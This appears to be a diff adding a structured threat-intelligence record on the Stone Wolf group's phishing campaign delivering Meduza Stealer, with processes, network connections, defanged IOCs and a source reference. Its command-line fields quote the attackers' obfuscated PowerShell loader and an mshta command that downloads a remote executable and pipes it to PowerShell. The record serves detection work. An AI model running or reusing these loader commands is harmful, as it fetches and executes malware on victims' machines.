@@ -1,0 +1,46 @@
+title: Stone Wolf employs Meduza Stealer to hack Russian companies
+description: Adversaries send phishing emails to deliver Meduza Stealer, targeting
+  Russian companies.
+attribution: ''
+malware_families:
+- Meduza Stealer
+cves: []
+ttps:
+  processes:
+  - SyncAppvPublishingServer.vbs
+  - mshta.exe
+  - powershell.exe
+  - wscript.exe
+  command_lines:
+  - SyncAppvPublishingServer.vbs;520,526,515,527,508,443,515,527,527,523,469,458,458,460,468,462,457,460,461,463,457,462,462,457,466,460,469,462,461,460,466,458,494,510,508,521,506,460,461,466,456,459,464,506,461,463,506,511,522,526,527,508,529,518,508,506,460,462,457,459,464,457,461,459,461,463,457,512,531,512|%{$p+=[char]($_-411)};$p | powershell
+  - mshta http://193.124.33[.]71:3217/Scan_127-05_24_dostavka_13.05.2024.exe | powershell
+    -
+  powershell:
+  - SyncAppvPublishingServer.vbs;520,526,515,527,508,443,515,527,527,523,469,458,458,460,468,462,457,460,461,463,457,462,462,457,466,460,469,462,461,460,466,458,494,510,508,521,506,460,461,466,456,459,464,506,461,463,506,511,522,526,527,508,529,518,508,506,460,462,457,459,464,457,461,459,461,463,457,512,531,512|%{$p+=[char]($_-411)};$p | powershell
+  - WScript.Shell.Run([command])
+  scripts:
+  - SyncAppvPublishingServer.vbs
+  registry_keys:
+  - HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
+  image_loads: []
+  network_connections:
+  - mshta.exe -> 193.124.33[.]71:3217
+  - powershell.exe -> 193.124.33[.]71:3217
+  - powershell.exe -> https://api.ipify[.]org
+  file_activity: []
+  persistence: []
+  process_relations:
+  - SyncAppvPublishingServer.vbs -> mshta.exe
+  - mshta.exe -> powershell.exe
+iocs:
+  hashes: []
+  ip_addresses:
+  - 193.124.33[.]71
+  - 109.120.177[.]48
+  domains: []
+  urls:
+  - hxxps://api.ipify[.]org
+authors: []
+reference: https://bi.zone/eng/expertise/blog/stone-wolf-atakuet-rossiyskie-kompanii-stilerom-meduza
+date_of_publication: December 01, 2025
+file_creation_date: May 01, 2026
